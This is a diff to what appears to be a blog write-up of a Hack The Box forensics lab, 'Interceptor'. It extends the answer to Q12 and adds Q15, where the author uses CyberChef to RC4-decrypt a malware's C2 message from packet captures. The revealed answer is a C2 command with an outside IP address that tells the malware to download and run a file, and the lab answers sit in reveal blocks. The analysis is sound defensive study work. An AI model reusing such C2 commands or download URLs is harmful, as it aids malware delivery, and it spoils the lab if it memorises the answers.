@@ -8,6 +8,7 @@ tags:
 languages:
   - wireshark
   - virustotal
+  - cyberchef
 image:
   url: https://static.vitrine.ynov.com/cdn-cgi/image/width=650,height=422,fit=cover,format=auto/var/site/storage/images/1/8/0/3/193081-1-fre-FR/9e61ed312047-0x0.png
   alt: hack the box lab Interceptor
@@ -164,7 +165,7 @@ The other way, which i think is the one that the lab wants you to go through, is
 
 ## Q12: What is the key that was used in the attack?
 
-Following the second way of previous question, looking at the response for the POST packet with the path `/api/gateway` we can find this information, I was not looking for something in particular, just checking what was this `/api/gateway` about I found the key there.
+Following the second way of previous question, looking at the response for the POST packet with the path `/api/gateway` we can find this information, I was not looking for something in particular, just checking what was this `/api/gateway` about I found the key there, there is also another parameter with the name of `id`.
 
 <details>
   <summary>Click to reveal the answer</summary>
@@ -195,4 +196,29 @@ Same as last question, the information is already there.
   </div>
 </details>
 
-## Q15
+## Q15: After decrypting the communication from the malware, what command is revealed to be sent to the C2 server?
+
+Ok, lets see what we have and then try to solve this last decrypting challenge.
+So we already have a key from **Q12** and now we need the message and the algorithm. If we follow the HTTP from the POST request for the key, we will see something that seems interesting later on, there is a POST request where the `id` that we found with the key is in the path:
+
+![]()
+
+The response contains an `id` and a `job` parameters:
+
+```
+{"id": "576ba7b6-077c-45fb-94b4-10fd156e93c3", "job": "B//jOYkMjUR2wj+L/9U9WafJi7K/GMIoeILXOeXYfdGUMV8eNqoLdrQlZ35neKaqiGJ4Vijv4WuInBYFg1nnW9sY0sdq0imYHI1jW+skjZIgz3ICgNSxOkxRTpwzCA=="}
+```
+
+The job parameter seems to me the message we have to decrypt, also If we continue looking around I dont see more data on the requests or response on the following packets, so something has to be here.
+
+Now we have the key and the potential message to decrypt, and we need to know the algorithm. For this one I didn't know much about potential algorithms so I brute forced a little bit the posible decryptions that you can do using `CyberChef` this is a topic I need more knowledge about, and at least I could try to guess or discard some of the algorithms. And finally I found it after serveral time trying, the algorithm is `RC4`.
+
+![]()
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    {"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&module=2&filename=None"]}
+  </div>
+</details>
+
